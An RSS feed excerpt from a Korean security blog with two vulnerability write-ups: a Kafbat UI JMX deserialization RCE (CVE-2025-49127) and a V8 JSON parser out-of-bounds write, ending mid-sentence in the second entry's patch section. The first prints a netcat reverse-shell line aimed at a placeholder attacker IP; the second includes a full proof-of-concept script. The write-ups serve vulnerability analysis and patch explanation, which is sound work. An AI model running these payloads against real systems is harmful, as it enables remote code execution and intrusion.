<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Thu, 21 Aug 2025 06:01:29 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2025-49127  : Kafbat UI의 Unsafe Deserialization로 인한 Remote Code Execution</title>
      <link>https://hackyboiz.github.io/2025/08/20/romi0x/1day1line0820/</link>
      <guid>https://hackyboiz.github.io/2025/08/20/romi0x/1day1line0820/</guid>
      <pubDate>Wed, 20 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://blog.securelayer7.net/cve-2025-49127-kaf</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://blog.securelayer7.net/cve-2025-49127-kafbat-ui-rce-vulnerability/">https://blog.securelayer7.net/cve-2025-49127-kafbat-ui-rce-vulnerability/</a></p></li><li><p><a href="https://github.com/kafbat/kafka-ui/security/advisories/GHSA-g3mf-c374-fgh2">https://github.com/kafbat/kafka-ui/security/advisories/GHSA-g3mf-c374-fgh2</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><strong>Target Product</strong>: Kafbat UI 1.0.0</li><li><strong>Affected Versions</strong>: 1.1.0 &#xC774;&#xC0C1;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-49127&#xB85C; &#xC601;&#xD5A5;&#xBC1B;&#xB294; &#xC81C;&#xD488;&#xC778; <strong><a href="https://github.com/kafbat/kafka-ui">Kafbat UI</a>&#xB294; Apache Kafka &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xAD00;&#xB9AC;&#xB97C; &#xC704;&#xD55C; &#xC6F9; &#xAE30;&#xBC18; &#xB300;&#xC2DC;&#xBCF4;&#xB4DC;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC9C1;&#xAD00;&#xC801;&#xC778; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; Kafka &#xD658;&#xACBD;&#xC744; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xD558;&#xACE0; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xBA70;, &#xC8FC;&#xB85C; &#xB300;&#xADDC;&#xBAA8; &#xB370;&#xC774;&#xD130; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xD658;&#xACBD;(&#xAE08;&#xC735;, IoT, &#xB85C;&#xADF8; &#xC218;&#xC9D1;, &#xBE45;&#xB370;&#xC774;&#xD130; &#xBD84;&#xC11D; &#xB4F1;)&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xAD00;&#xB9AC;, &#xD1A0;&#xD53D; &#xAD00;&#xB9AC;, &#xCEE8;&#xC288;&#xBA38; &#xADF8;&#xB8F9; &#xCD94;&#xC801; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xBC88; &#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>&#xB3D9;&#xC801; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xC124;&#xC815;(Dynamic Cluster Configuration) &#xAE30;&#xB2A5;</strong>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xBC1C;&#xC0DD;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;"></a><strong>&#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xC0DD; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;</strong></h3><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <strong>&#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xC758; Metrics &#xC124;&#xC815;&#xC5D0;&#xC11C; type&#xC744; JMX&#xB85C; &#xC9C0;&#xC815;</strong>&#xD588;&#xC744; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h4 id="1-&#xC545;&#xC131;-Kafka-&#xBE0C;&#xB85C;&#xCEE4;-&#xAD6C;&#xC131;"><a href="#1-&#xC545;&#xC131;-Kafka-&#xBE0C;&#xB85C;&#xCEE4;-&#xAD6C;&#xC131;" class="headerlink" title="1. &#xC545;&#xC131; Kafka &#xBE0C;&#xB85C;&#xCEE4; &#xAD6C;&#xC131;"></a>1. &#xC545;&#xC131; Kafka &#xBE0C;&#xB85C;&#xCEE4; &#xAD6C;&#xC131;</h4><p>   &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC545;&#xC131; Kafka &#xBE0C;&#xB85C;&#xCEE4;&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xACE0;, &#xC774; &#xBE0C;&#xB85C;&#xCEE4;&#xC758; <code>advertised.listeners</code> &#xAC12;&#xC744; &#xC870;&#xC791;&#xD558;&#xC5EC; &#xC790;&#xC2E0;&#xC774; &#xC81C;&#xC5B4;&#xD558;&#xB294; JMX RMI &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xB4F1;&#xB85D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>   &#xC5EC;&#xAE30;&#xC11C; <code>advertised.listeners</code>&#xB294; Kafka &#xBE0C;&#xB85C;&#xCEE4;&#xAC00; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;(&#xC608;: Kafbat UI, &#xD504;&#xB85C;&#xB4C0;&#xC11C;/&#xCEE8;&#xC288;&#xBA38;)&#xC5D0;&#xAC8C; &#x201C;&#xC811;&#xC18D;&#xD560; &#xB54C; &#xC774; &#xC8FC;&#xC18C;&#xB85C; &#xC811;&#xC18D;&#xD558;&#xB77C;&#x201D; &#xB77C;&#xACE0; &#xC548;&#xB0B4;&#xD558;&#xB294; &#xC124;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>   &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xAC12;&#xC744; &#xC545;&#xC131; JMX &#xC8FC;&#xC18C;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294;&#xAC81;&#xB2C8;&#xB2E4;.</p><pre><code>service:jmx:rmi:///jndi/rmi://&lt;&#xACF5;&#xACA9;&#xC790;_IP&gt;:&lt;&#xD3EC;&#xD2B8;&gt;/jmxrmi</code></pre><p>   &#xADF8;&#xB7FC;, &#xAD00;&#xB9AC;&#xC790;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD074;&#xB7EC;&#xC2A4;&#xD130;&#xB97C; Kafbat UI&#xC5D0; &#xB4F1;&#xB85D;&#xD558;&#xBA74;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; JVM &#xC11C;&#xBC84;&#xB85C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB429;&#xB2C8;&#xB2E4;.</p><h4 id="2-&#xC9C1;&#xB82C;&#xD654;&#xB41C;-&#xAC1D;&#xCCB4;-&#xAD50;&#xD658;"><a href="#2-&#xC9C1;&#xB82C;&#xD654;&#xB41C;-&#xAC1D;&#xCCB4;-&#xAD50;&#xD658;" class="headerlink" title="2. &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4; &#xAD50;&#xD658;"></a>2. &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4; &#xAD50;&#xD658;</h4><p>   JMX&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; Java RMI(Remote Method Invocation) &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA70;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4;(Serialized Object)&#xB97C; &#xAD50;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. </p><p>   &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC870;&#xC791;&#xD55C; JMX &#xC11C;&#xBC84;&#xB294; CommonsCollections &#xB4F1;&#xC758; &#xAC00;&#xC82F; &#xCCB4;&#xC778;(Gadget Chain)&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xC545;&#xC131; &#xC9C1;&#xB82C;&#xD654; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><h4 id="3-&#xC5ED;&#xC9C1;&#xB82C;&#xD654;-&#x2192;-&#xC6D0;&#xACA9;-&#xCF54;&#xB4DC;-&#xC2E4;&#xD589;"><a href="#3-&#xC5ED;&#xC9C1;&#xB82C;&#xD654;-&#x2192;-&#xC6D0;&#xACA9;-&#xCF54;&#xB4DC;-&#xC2E4;&#xD589;" class="headerlink" title="3. &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#x2192; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;"></a>3. &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#x2192; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;</h4><p>   Kafbat UI&#xB294; &#xC774; &#xAC1D;&#xCCB4;&#xB97C; &#xC2E0;&#xB8B0;&#xD558;&#xACE0; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xBA74;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC2EC;&#xC5B4;&#xB454; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;</p><pre><code>Runtime.getRuntime().exec(&quot;nc &lt;&#xACF5;&#xACA9;&#xC790;_IP&gt; 9094 -e sh&quot;);</code></pre><p>   &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C;, &#xACF5;&#xACA9;&#xC790;&#xB294; Kafbat UI &#xC11C;&#xBC84;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="&#xCDE8;&#xC57D;-&#xCF54;&#xB4DC;"><a href="#&#xCDE8;&#xC57D;-&#xCF54;&#xB4DC;" class="headerlink" title="&#xCDE8;&#xC57D; &#xCF54;&#xB4DC;"></a>&#xCDE8;&#xC57D; &#xCF54;&#xB4DC;</h3><p>&#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB294; Kafbat UI 1.0&#xC758; <code>JmxMetricsRetriever.java</code> &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml">@SneakyThrows<span class="hljs-keyword">private</span> List&lt;RawMetric&gt; retrieve<span class="hljs-constructor">Sync(KafkaCluster <span class="hljs-params">c</span>, Node <span class="hljs-params">node</span>)</span> {    String jmxUrl = <span class="hljs-string">&quot;service:jmx:rmi:///jndi/rmi://&quot;</span>        + node.host<span class="hljs-literal">()</span> + <span class="hljs-string">&quot;:&quot;</span>         + c.get<span class="hljs-constructor">MetricsConfig()</span>.get<span class="hljs-constructor">Port()</span>         + <span class="hljs-string">&quot;/jmxrmi&quot;</span>;    <span class="hljs-keyword">with</span><span class="hljs-constructor">JmxConnector(<span class="hljs-params">jmxUrl</span>, <span class="hljs-params">c</span>, <span class="hljs-params">jmxConnector</span> -&gt; <span class="hljs-params">getMetricsFromJmx</span>(<span class="hljs-params">jmxConnector</span>, <span class="hljs-params">result</span>)</span>);    return result;}</code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xC758; &#xBB38;&#xC81C;&#xB294; <code>node.host()</code>&#xC640; <code>metricsConfig.port</code> &#xAC12;&#xC774; &#xC678;&#xBD80;&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xB41C; &#xAC12;&#xC5D0; &#xC758;&#xD574; &#xADF8;&#xB300;&#xB85C; &#xC81C;&#xC5B4;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C;, &#xC774; &#xAC12;&#xB4E4;&#xC5D0; &#xB300;&#xD574; &#xBCC4;&#xB3C4;&#xC758; URL &#xAC80;&#xC99D;&#xC774;&#xB098; &#xD544;&#xD130;&#xB9C1; &#xACFC;&#xC815;&#xC774; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xAD6D; <code>JMXConnectorFactory.newJMXConnector</code>&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD55C; JMX &#xC11C;&#xBC84; &#xC8FC;&#xC18C;&#xB85C; &#xC5F0;&#xACB0;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xAC8C; &#xB418;&#xACE0;, &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC18;&#xD658;&#xB418;&#xB294; &#xC9C1;&#xB82C;&#xD654; &#xAC1D;&#xCCB4;&#xB97C; &#xC544;&#xBB34;&#xB7F0; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB9CC;&#xB4E0; &#xC545;&#xC131; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xAC00; &#xADF8;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA70; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="&#xD328;&#xCE58;-&#xCF54;&#xB4DC;"><a href="#&#xD328;&#xCE58;-&#xCF54;&#xB4DC;" class="headerlink" title="&#xD328;&#xCE58; &#xCF54;&#xB4DC;"></a>&#xD328;&#xCE58; &#xCF54;&#xB4DC;</h3><p>&#xD328;&#xCE58;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <strong>JMX &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xAC80;&#xC99D;&#xC774; &#xCD94;&#xAC00;</strong>&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs reasonml"><span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">SafeJmxEndpoint(<span class="hljs-params">node</span>.<span class="hljs-params">host</span>()</span>, c.get<span class="hljs-constructor">MetricsConfig()</span>.get<span class="hljs-constructor">Port()</span>)) {    throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">ValidationException(<span class="hljs-string">&quot;Invalid JMX endpoint&quot;</span>)</span>;}<span class="hljs-keyword">try</span> (JMXConnector connector =         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JMXConnectorFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">JMXConnector(<span class="hljs-params">new</span> JMXServiceURL(<span class="hljs-params">jmxUrl</span>)</span>, env)) {    connector.connect(env);    consumer.accept(connector);}</code></pre><p>&#xB610;&#xD55C; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC5D0;&#xC11C; <code>DYNAMIC_CONFIG_ENABLED=false</code> &#xAC00; &#xC801;&#xC6A9;&#xB418;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xD558;&#xC5EC;, &#xBCC4;&#xB3C4; &#xC124;&#xC815; &#xC5C6;&#xC774;&#xB294; &#xB3D9;&#xC801; &#xD074;&#xB7EC;&#xC2A4;&#xD130; &#xCD94;&#xAC00;&#xAC00; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/kafbat/kafka-ui/releases/tag/v1.1.0">https://github.com/kafbat/kafka-ui/releases/tag/v1.1.0</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kafbat/">Kafbat</category>
      
      <category domain="https://hackyboiz.github.io/tags/Kafbat-UI/">Kafbat UI</category>
      
      <category domain="https://hackyboiz.github.io/tags/Unsafe-Deserialization/">Unsafe Deserialization</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/20/romi0x/1day1line0820/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Issue 396446145 : V8 json parser의 OOB write로 인한 V8 sandbox escape 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/19/d4tura/2025-08-19/</link>
      <guid>https://hackyboiz.github.io/2025/08/19/d4tura/2025-08-19/</guid>
      <pubDate>Tue, 19 Aug 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://issues.chromium.org/issues/396446145&quot;&gt;https</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://issues.chromium.org/issues/396446145">https://issues.chromium.org/issues/396446145</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Chrome version &lt; 137.0.7137.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>v8&#xC5D0;&#xC11C; <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse">JSON.parse</a> &#xD568;&#xC218;&#xB85C;  <code>&apos;{&quot;result&quot;:true, &quot;count&quot;:42}&apos;</code> &#xAC19;&#xC774; &#x201C;result&#x201D;, &#x201C;conut&#x201D; &#xAC19;&#xC740; string data&#xAC00; &#xD3EC;&#xD568;&#xB41C; JSON &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCC98;&#xB9AC;&#xD560;&#xB54C; escape character&#xC778; &#xBC31;&#xC2AC;&#xB798;&#xC2DC;( <code>\\</code>) &#xAC00; &#xD3EC;&#xD568;&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xC744; &#xACBD;&#xC6B0;, &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xAC70;&#xCCD0; <code>JsonParser&lt;Char&gt;::DecodeString</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.h;l=165;bpv=1;bpt=0">JsonParser::Parse</a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=532;bpv=1;bpt=0">JsonParser<char>::ParseJson</char></a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/json/json-parser.cc;l=1847;drc=c75642d079627158765ffca787e9a60d6a657ca5;bpv=1;bpt=1">JsonParser<char>::</char></a><a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=1634;bpv=1;bpt=0">ParseJsonValue</a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=2115;bpv=1;bpt=0">JsonParser<char>::MakeString</char></a></p><p>&#x2192; <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/137.0.7136.1:v8/src/json/json-parser.cc;l=2156;bpv=1;bpt=0">JsonParser<char>::DecodeString</char></a> </p><pre><code class="hljs cpp"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Char&gt;<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">bool</span> should_track_json_source&gt;MaybeHandle&lt;Object&gt; JsonParser&lt;Char&gt;::ParseJsonValue() {  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;JsonContinuation&gt; cont_stack;  <span class="hljs-comment">// ....</span>          <span class="hljs-keyword">case</span> JsonToken::STRING:          Consume(JsonToken::STRING);          value = MakeString(ScanJsonString(<span class="hljs-literal">false</span>)); <span class="hljs-comment">// &lt;-- here</span>          <span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">constexpr</span> <span class="hljs-params">(should_track_json_source)</span> </span>{            end_position = position();            val_node = isolate_-&gt;factory()-&gt;NewSubString(                source_, start_position, end_position);          }          <span class="hljs-keyword">break</span>;          .....<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Char&gt;Handle&lt;String&gt; JsonParser&lt;Char&gt;::MakeString(<span class="hljs-keyword">const</span> JsonString&amp; <span class="hljs-built_in">string</span>,                                            Handle&lt;String&gt; hint) {  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.length() == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> factory()-&gt;empty_string();  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.length() == <span class="hljs-number">1</span>) {    <span class="hljs-keyword">uint16_t</span> first_char;    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.has_escape()) {      first_char = chars_[<span class="hljs-built_in">string</span>.start()];    } <span class="hljs-keyword">else</span> {    <span class="hljs-comment">//</span>    <span class="hljs-comment">// here</span>    <span class="hljs-comment">//</span>      DecodeString(&amp;first_char, <span class="hljs-built_in">string</span>.start(), <span class="hljs-number">1</span>);    }    <span class="hljs-keyword">return</span> factory()-&gt;LookupSingleCharacterStringFromCode(first_char);  }</code></pre><p><code>JsonParser&lt;Char&gt;::DecodeString</code>  &#xD568;&#xC218;&#xB294; length &#xCCB4;&#xD06C; &#xC5C6;&#xC774; &#xBC31;&#xC2AC;&#xB798;&#xC2DC; &#xBB38;&#xC790;&#xB97C; &#xCC3E;&#xC744;&#xB54C;&#xAE4C;&#xC9C0; &#xACC4;&#xC18D; &#xB8E8;&#xD504;&#xB97C; &#xBC18;&#xBCF5;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; loop&#xAC00; &#xC2E4;&#xD589;&#xC911;&#xC77C;&#xB54C; &#xB2E4;&#xB978; thread&#xC5D0;&#xC11C; &#xB514;&#xCF54;&#xB529; &#xC911;&#xC778; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC218;&#xC815;&#xD574;&#xC11C; &#xBC31;&#xC2AC;&#xB798;&#xC26C;&#xB97C; &#xC9C0;&#xC6CC;&#xBC84;&#xB9AC;&#xBA74; OOB write&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">void</span> JsonParser&lt;Char&gt;::DecodeString(SinkChar* sink, <span class="hljs-keyword">uint32_t</span> start,                                    <span class="hljs-keyword">uint32_t</span> length) {  SinkChar* sink_start = sink;  <span class="hljs-keyword">const</span> Char* cursor = chars_ + start;  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {    <span class="hljs-keyword">const</span> Char* end = cursor + length - (sink - sink_start);    cursor = <span class="hljs-built_in">std</span>::find_if(cursor, end, [&amp;sink](Char c) {      <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&apos;\\&apos;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;      *sink++ = c;      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    });</code></pre><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p><a href="https://issues.chromium.org/action/issues/396446145/attachments/62924832?download=false">&#xC6D0;&#xBCF8; PoC &#xCF54;&#xB4DC;</a>&#xB97C; &#xBCF4;&#xC2DC;&#xBA74; <a href="https://developer.mozilla.org/en-US/docs/Web/API/Worker/Worker">Worker &#xC0DD;&#xC131;&#xC790;</a>&#xB97C; &#xD1B5;&#xD574; background task thread&#xB97C; &#xC0DD;&#xC131; &#xD6C4;, <a href="https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/src/sandbox/README.md">Sandbox API</a> &#xB97C; &#xC0AC;&#xC6A9;&#xD574; <code>JSON.parse</code> &#xC5D0;&#xC11C; &#xD30C;&#xC2F1;&#xC911;&#xC778; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC; &#xD6C4; &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; OOB  write &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> sbx_memory = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(<span class="hljs-keyword">new</span> Sandbox.MemoryView(<span class="hljs-number">0</span>, <span class="hljs-number">0x100000000</span>));<span class="hljs-keyword">const</span> v9 = <span class="hljs-built_in">String</span>.fromCodePoint(<span class="hljs-number">6</span>);<span class="hljs-keyword">const</span> v14 = <span class="hljs-built_in">JSON</span>.stringify(v9);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">corruptInBackground</span>(<span class="hljs-params">address</span>) </span>{    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">workerTemplate</span>(<span class="hljs-params">address</span>) </span>{        <span class="hljs-keyword">let</span> memory = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(<span class="hljs-keyword">new</span> Sandbox.MemoryView(<span class="hljs-number">0</span>, <span class="hljs-number">0x100000000</span>));        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {            memory.setUint8(address, <span class="hljs-number">0x30</span>, <span class="hljs-literal">true</span>);            memory.setUint8(address, <span class="hljs-number">0xcf</span>, <span class="hljs-literal">true</span>);        }    }    <span class="hljs-keyword">const</span> workerCode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>(        <span class="hljs-string">`(<span class="hljs-subst">${workerTemplate}</span>)(<span class="hljs-subst">${address}</span>)`</span>);    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Worker(workerCode, { <span class="hljs-attr">type</span>: <span class="hljs-string">&apos;function&apos;</span> });}<span class="hljs-keyword">let</span> v14_addr = Sandbox.getAddressOf(v14);print(<span class="hljs-string">&quot;v14_addr: 0x&quot;</span> + v14_addr.toString(<span class="hljs-number">16</span>));<span class="hljs-comment">// Address of the singeel byte in the one byte string</span><span class="hljs-keyword">const</span> c = sbx_memory.getUint8(v14_addr + <span class="hljs-number">16</span>);print(<span class="hljs-string">&quot;c: 0x&quot;</span> + c.toString(<span class="hljs-number">16</span>));corruptInBackground(v14_addr + <span class="hljs-number">16</span>)<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {    <span class="hljs-keyword">try</span> {        <span class="hljs-built_in">JSON</span>.parse(v14);    } <span class="hljs-keyword">catch</span> (e) {        print(e)    }}</code></pre><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><ul><li>&#xD328;&#xCE58; commit<ul><li><a href="https://chromium-review.googlesource.com/c/v8/v8/+/6448401">https://chromium-review.googlesource.com/c/v8/v8/+/6448401</a></li></ul></li></ul><p><code>JsonParser&lt;Char&gt;::DecodeString</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xB294; 